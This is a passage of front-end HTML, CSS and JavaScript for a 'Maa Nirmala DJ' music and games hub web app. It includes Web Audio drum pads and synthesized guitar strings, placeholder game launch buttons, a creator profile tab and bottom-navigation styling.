        <div class="mnd-studio-panel">
            <h3 class="mnd-panel-title">MND Drum Machine (808)</h3>
            <div class="mnd-drum-grid">
                <button class="mnd-drum-pad" onclick="mndSynth.playKick()" ontouchstart="mndSynth.playKick()">
                    <span class="pad-label">KICK</span>
                    <div class="pad-glow kick-glow"></div>
                </button>
                <button class="mnd-drum-pad" onclick="mndSynth.playSnare()" ontouchstart="mndSynth.playSnare()">
                    <span class="pad-label">SNARE</span>
                    <div class="pad-glow snare-glow"></div>
                </button>
                <button class="mnd-drum-pad" onclick="mndSynth.playHiHat()" ontouchstart="mndSynth.playHiHat()">
                    <span class="pad-label">HI-HAT</span>
                    <div class="pad-glow hat-glow"></div>
                </button>
                <button class="mnd-drum-pad" onclick="mndSynth.playTom()" ontouchstart="mndSynth.playTom()">
                    <span class="pad-label">TOM</span>
                    <div class="pad-glow tom-glow"></div>
                </button>
                <button class="mnd-drum-pad" onclick="mndSynth.playClap()" ontouchstart="mndSynth.playClap()">
                    <span class="pad-label">CLAP</span>
                    <div class="pad-glow clap-glow"></div>
                </button>
                <button class="mnd-drum-pad" onclick="mndSynth.playCrash()" ontouchstart="mndSynth.playCrash()">
                    <span class="pad-label">CRASH</span>
                    <div class="pad-glow crash-glow"></div>
                </button>
            </div>
        </div>

        <div class="mnd-studio-panel" style="margin-top: 25px;">
            <h3 class="mnd-panel-title">Digital Guitar Strings</h3>
            <div class="mnd-guitar-flex">
                <button class="mnd-string-btn" onclick="mndSynth.playString(164.81)">E (Low)</button>
                <button class="mnd-string-btn" onclick="mndSynth.playString(220.00)">A</button>
                <button class="mnd-string-btn" onclick="mndSynth.playString(293.66)">D</button>
                <button class="mnd-string-btn" onclick="mndSynth.playString(392.00)">G</button>
                <button class="mnd-string-btn" onclick="mndSynth.playString(493.88)">B</button>
                <button class="mnd-string-btn" onclick="mndSynth.playString(659.25)">e (High)</button>
            </div>
        </div>
        <div style="height: 100px;"></div> </div>

    <div id="mndTabGames" class="mnd-hub-tab-content" style="display: none;">
        <div class="mnd-section-header">
            <h2><i class="fas fa-gamepad" style="color: #00fa9a;"></i> ARCADE MATRIX</h2>
            <span class="mnd-badge green-badge">120 FPS</span>
        </div>

        <div class="mnd-games-grid">
            <div class="mnd-game-card">
                <div class="game-img-ph snake-bg"><i class="fas fa-worm"></i></div>
                <div class="game-info">
                    <h4>Neon Snake 3D</h4>
                    <p>Classic survival arcade</p>
                    <button class="mnd-play-btn" onclick="alert('Loading Neon Snake engine...')"><i class="fas fa-play"></i> LAUNCH</button>
                </div>
            </div>
            <div class="mnd-game-card">
                <div class="game-img-ph ludo-bg"><i class="fas fa-dice-four"></i></div>
                <div class="game-info">
                    <h4>MND Ludo King</h4>
                    <p>Multiplayer board action</p>
                    <button class="mnd-play-btn" onclick="alert('Connecting to Ludo servers...')"><i class="fas fa-play"></i> LAUNCH</button>
                </div>
            </div>
            <div class="mnd-game-card">
                <div class="game-img-ph race-bg"><i class="fas fa-car-side"></i></div>
                <div class="game-info">
                    <h4>Cyber Racing</h4>
                    <p>High-speed drift</p>
                    <button class="mnd-play-btn" onclick="alert('Revving engines...')"><i class="fas fa-play"></i> LAUNCH</button>
                </div>
            </div>
        </div>
    ...
    <div id="mndTabAbout" class="mnd-hub-tab-content" style="display: none;">
        <div class="mnd-creator-profile">
            <div class="creator-avatar-ring">
                <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" class="creator-avatar">
            </div>
            <h1 class="mnd-live-gradient-text">LALU KUMAR TANTI</h1>
            <p class="creator-title">Founder & Lead Engineer @ Maa Nirmala DJ</p>
            
            <div class="creator-stats-flex">
                <div class="stat-box">
                    <i class="fas fa-code"></i>
                    <span>SYSTEM</span>
                    <strong>v11.0 OS</strong>
                </div>
                <div class="stat-box">
            ...
            <div class="creator-bio-card">
                <h3><i class="fas fa-bolt"></i> ABOUT THE HUB</h3>
                <p>Welcome to the ultimate digital workspace. This Enterprise-Grade single-page application is equipped with biological neural scanning, WebAuthn device locks, live Web Audio API synthesis, and hardware-accelerated rendering.</p>
                <div class="mnd-social-flex">
    ...
    <nav class="mnd-bottom-nav">
        <a href="javascript:void(0)" class="mnd-nav-item mnd-nav-active" onclick="mndHub.switchTab('mndTabStudio', this)">
            <div class="nav-icon-wrap"><i class="fas fa-headphones"></i></div>
            <span>STUDIO</span>
        </a>
        <a href="javascript:void(0)" class="mnd-nav-item" onclick="mndHub.switchTab('mndTabGames', this)">
            <div class="nav-icon-wrap"><i class="fas fa-gamepad"></i></div>
            <span>GAMES</span>
        </a>
        <a href="javascript:void(0)" class="mnd-nav-item" onclick="mndHub.switchTab('mndTabAbout', this)">
...
<style>
    /* HUB MASTER CONTAINER */
    .mnd-hub-master-container {
        position: fixed; inset: 0; background: var(--mnd-bg-dark);
        z-index: 99999; overflow-y: auto; overflow-x: hidden;
        background-image: radial-gradient(circle at 15% 50%, rgba(212,175,55,0.05), transparent 30%), radial-gradient(circle at 85% 30%, rgba(0,250,154,0.05), transparent 30%);
    ...
    .mnd-hub-topbar {
        ...
        padding: 15px 20px; background: rgba(10,10,10,0.8);
        backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
        border-bottom: 1px solid rgba(255,255,255,0.05); position: sticky; top: 0; z-index: 50;
    }
    .mnd-topbar-left { display: flex; align-items: center; gap: 12px; }
    .mnd-hub-mini-logo { width: 35px; height: 35px; border-radius: 50%; border: 1px solid var(--mnd-gold-primary); }
    .mnd-live-text { font-family: var(--mnd-font-head); font-size: 16px; font-weight: 900; color: #fff; letter-spacing: 1px; }
    .mnd-topbar-right { color: var(--mnd-red-danger); font-size: 12px; font-weight: 800; cursor: pointer; padding: 8px 12px; background: rgba(255,51,51,0.1); border-radius: 8px; }

    /* TAB CONTENT */
    .mnd-hub-tab-content { padding: 25px 20px; animation: tabFadeIn 0.4s cubic-bezier(0.2, 0.8, 0.2, 1) forwards; }
    @keyframes tabFadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }

    .mnd-section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; padding-bottom: 15px; border-bottom: 1px solid rgba(255,255,255,0.08); }
    .mnd-section-header h2 { font-family: var(--mnd-font-head); font-size: 22px; color: #fff; text-shadow: 0 2px 10px rgba(0,0,0,0.8); }
    .mnd-badge { font-size: 10px; font-weight: 800; padding: 4px 10px; border-radius: 20px; letter-spacing: 1px; }
    .pink-badge { background: rgba(255,0,127,0.15); color: #ff007f; border: 1px solid rgba(255,0,127,0.3); }
    .green-badge { background: rgba(0,250,154,0.15); color: #00fa9a; border: 1px solid rgba(0,250,154,0.3); }

    /* MUSIC STUDIO PANELS */
    .mnd-studio-panel { background: rgba(20,20,20,0.6); border: 1px solid rgba(255,255,255,0.08); border-radius: 20px; padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
    .mnd-panel-title { color: var(--mnd-text-muted); font-size: 12px; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 20px; text-align: center; }
    
    .mnd-drum-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; }
    .mnd-drum-pad { 
        aspect-ratio: 1; background: linear-gradient(135deg, #222, #111); border: 1px solid #333; 
        border-radius: 16px; position: relative; overflow: hidden; cursor: pointer; 
        display: flex; justify-content: center; align-items: center; box-shadow: 0 5px 15px rgba(0,0,0,0.8);
        transition: 0.1s; -webkit-tap-highlight-color: transparent;
    }
    .mnd-drum-pad:active { transform: scale(0.92); border-color: #555; }
    .pad-label { color: #fff; font-family: var(--mnd-font-body); font-weight: 900; font-size: 13px; z-index: 2; pointer-events: none; text-shadow: 0 2px 5px rgba(0,0,0,0.8); }
    .pad-glow { position: absolute; inset: 0; opacity: 0; transition: 0.2s; z-index: 1; pointer-events: none; }
    .mnd-drum-pad:active .pad-glow { opacity: 1; }
    .kick-glow { background: radial-gradient(circle, rgba(255,0,127,0.5) 0%, transparent 70%); }
    .snare-glow { background: radial-gradient(circle, rgba(0,250,154,0.5) 0%, transparent 70%); }
    .hat-glow { background: radial-gradient(circle, rgba(0,210,255,0.5) 0%, transparent 70%); }
    .tom-glow { background: radial-gradient(circle, rgba(212,175,55,0.5) 0%, transparent 70%); }
    .clap-glow { background: radial-gradient(circle, rgba(155,89,182,0.5) 0%, transparent 70%); }
    .crash-glow { background: radial-gradient(circle, rgba(255,100,0,0.5) 0%, transparent 70%); }

    .mnd-guitar-flex { display: flex; flex-direction: column; gap: 10px; }
    .mnd-string-btn { 
        width: 100%; padding: 16px; background: rgba(30,30,30,0.5); border: 1px solid rgba(212,175,55,0.2); 
        border-radius: 12px; color: var(--mnd-gold-primary); font-family: var(--mnd-font-body); font-weight: 800; 
        font-size: 16px; text-align: left; padding-left: 25px; position: relative; overflow: hidden;
    }
    .mnd-string-btn::after { content: ''; position: absolute; left: 0; top: 50%; transform: translateY(-50%); width: 100%; height: 2px; background: rgba(255,255,255,0.1); z-index: 0; }
    .mnd-string-btn:active { background: rgba(212,175,55,0.15); transform: scale(0.98); }

    /* GAMES ZONE */
    .mnd-games-grid { display: flex; flex-direction: column; gap: 20px; }
    .mnd-game-card { 
        display: flex; background: rgba(20,20,20,0.6); border: 1px solid rgba(255,255,255,0.08); 
        border-radius: 20px; padding: 15px; align-items: center; gap: 15px; 
    }
    .game-img-ph { width: 80px; height: 80px; border-radius: 15px; display: flex; justify-content: center; align-items: center; font-size: 35px; color: #fff; box-shadow: inset 0 0 20px rgba(0,0,0,0.5); }
    .snake-bg { background: linear-gradient(135deg, #00fa9a, #008855); }
    .ludo-bg { background: linear-gradient(135deg, #ff007f, #aa0055); }
    .race-bg { background: linear-gradient(135deg, #00d2ff, #0055ff); }
    .game-info { flex: 1; }
    .game-info h4 { color: #fff; font-size: 18px; margin-bottom: 4px; }
    .game-info p { color: var(--mnd-text-muted); font-size: 12px; margin-bottom: 12px; }
    .mnd-play-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: #fff; padding: 8px 15px; border-radius: 8px; font-weight: 800; font-size: 11px; cursor: pointer; transition: 0.2s; }
    .mnd-play-btn:active { background: #fff; color: #000; transform: scale(0.95); }

    /* CREATOR PROFILE */
    .mnd-creator-profile { text-align: center; padding-top: 20px; }
    .creator-avatar-ring { width: 120px; height: 120px; margin: 0 auto 20px; border-radius: 50%; padding: 4px; background: linear-gradient(135deg, var(--mnd-gold-primary), #ff007f); box-shadow: 0 10px 30px rgba(212,175,55,0.3); }
    .creator-avatar { width: 100%; height: 100%; border-radius: 50%; border: 3px solid #000; object-fit: cover; }
    .mnd-live-gradient-text { 
        font-family: var(--mnd-font-head); font-size: 32px; font-weight: 900; 
        background: linear-gradient(270deg, var(--mnd-gold-primary), #ff007f, #00fa9a, var(--mnd-gold-primary)); 
        background-size: 300% 300%; -webkit-background-clip: text; -webkit-text-fill-color: transparent; 
        animation: liveGradient 8s ease infinite; margin-bottom: 5px; 
    }
    .creator-title { color: var(--mnd-text-muted); font-size: 14px; margin-bottom: 30px; }
    
    .creator-stats-flex { display: flex; justify-content: space-between; gap: 10px; margin-bottom: 30px; }
    .stat-box { flex: 1; background: rgba(20,20,20,0.6); border: 1px solid rgba(255,255,255,0.05); padding: 15px 5px; border-radius: 16px; display: flex; flex-direction: column; align-items: center; gap: 8px; }
    .stat-box i { color: var(--mnd-gold-primary); font-size: 20px; }
    .stat-box span { color: #777; font-size: 10px; font-weight: 800; letter-spacing: 1px; }
    .stat-box strong { color: #fff; font-size: 18px; }

    .creator-bio-card { background: rgba(20,20,20,0.8); border: 1px solid rgba(212,175,55,0.2); border-radius: 20px; padding: 25px; text-align: left; }
    .creator-bio-card h3 { color: var(--mnd-gold-primary); font-size: 14px; margin-bottom: 12px; letter-spacing: 2px; }
    .creator-bio-card p { color: #ddd; font-size: 14px; line-height: 1.6; font-weight: 300; margin-bottom: 20px; }
    .mnd-social-flex { display: flex; gap: 15px; }
    .social-btn { width: 45px; height: 45px; border-radius: 12px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: #fff; font-size: 20px; cursor: pointer; transition: 0.2s; }
    .social-btn:active { background: var(--mnd-gold-primary); color: #000; transform: scale(0.9); }

    /* APPLE NATIVE BOTTOM NAV */
    .mnd-bottom-nav {
        ...
        border: 1px solid rgba(255,255,255,0.1); border-radius: 25px; display: flex; justify-content: space-around;
        padding: 8px 5px; z-index: 99999; box-shadow: 0 20px 40px rgba(0,0,0,0.9);
    }
    .mnd-nav-item {
        display: flex; flex-direction: column; align-items: center; justify-content: center; width: 30%;
        color: #777; text-decoration: none; padding: 10px 0; border-radius: 18px; transition: 0.3s; position: relative;
    }
    .nav-icon-wrap { font-size: 22px; margin-bottom: 4px; transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 2; }
    .mnd-nav-item span { font-size: 10px; font-weight: 800; letter-spacing: 0.5px; z-index: 2; }
    
    .mnd-nav-active { color: var(--mnd-gold-primary); }
    .mnd-nav-active .nav-icon-wrap { transform: translateY(-4px) scale(1.1); filter: drop-shadow(0 0 8px rgba(212,175,55,0.5)); }
    .mnd-nav-item::before { content: ''; position: absolute; inset: 0; background: rgba(212,175,55,0.1); border-radius: 18px; opacity: 0; transform: scale(0.8); transition: 0.3s; z-index: 1; }
    .mnd-nav-active::before { opacity: 1; transform: scale(1); }
...
<script>
    ...
    const mndHub = {
        switchTab: function(tabId, element) {
            ...
            document.querySelectorAll('.mnd-nav-item').forEach(el => el.classList.remove('mnd-nav-active'));
            element.classList.add('mnd-nav-active');

            // Hide all tabs
            document.querySelectorAll('.mnd-hub-tab-content').forEach(tab => {
            ...
            target.style.animation = 'tabFadeIn 0.4s cubic-bezier(0.2, 0.8, 0.2, 1) forwards';
        }
    };

    // --- LIVE AUDIO SYNTHESIZER (NO MP3s REQUIRED, GENERATES SOUND FROM BROWSER!) ---
    const mndSynth = {
        ctx: null,
        ...
        playHiHat: function() {
            ...
            noise.connect(bandpass); bandpass.connect(gain); gain.connect(this.ctx.destination);
            noise.start(now);
        },
        
        playTom: function() { this.init(); const osc = this.ctx.createOscillator(); const gain = this.ctx.createGain(); osc.connect(gain); gain.connect(this.ctx.destination); const now = this.ctx.currentTime; osc.frequency.setValueAtTime(120, now); osc.frequency.exponentialRampToValueAtTime(0.01, now + 0.4); gain.gain.setValueAtTime(1, now); gain.gain.exponentialRampToValueAtTime(0.01, now + 0.4); osc.start(now); osc.stop(now + 0.4); },
        playClap: function() { this.playSnare(); setTimeout(()=>this.playSnare(), 20); }, // Simple clap illusion
        playCrash: function() { this.init(); const now = this.ctx.currentTime; const bufferSize = this.ctx.sampleRate * 1.5; const buffer = this.ctx.createBuffer(1, bufferSize, this.ctx.sampleRate); const data = buffer.getChannelData(0); for (let i = 0; i < bufferSize; i++) data[i] = Math.random() * 2 - 1; const noise = this.ctx.createBufferSource(); noise.buffer = buffer; const filter = this.ctx.createBiquadFilter(); filter.type = 'highpass'; filter.frequency.value = 4000; const gain = this.ctx.createGain(); gain.gain.setValueAtTime(1, now); gain.gain.exponentialRampToValueAtTime(0.01, now + 1.5); noise.connect(filter); filter.connect(gain); gain.connect(this.ctx.destination); noise.start(now); },

        // Play Guitar String (Synth Pluck)
        playString: function(frequency) {
            this.init();
            const osc = this.ctx.createOscillator();
            const gain = this.ctx.createGain();
            osc.type = 'sine'; // Basic clean string sound
            osc.frequency.value = frequency;
            
            const now = this.ctx.currentTime;
            gain.gain.setValueAtTime(1, now);
            gain.gain.exponentialRampToValueAtTime(0.001, now + 2); // 2 second string decay
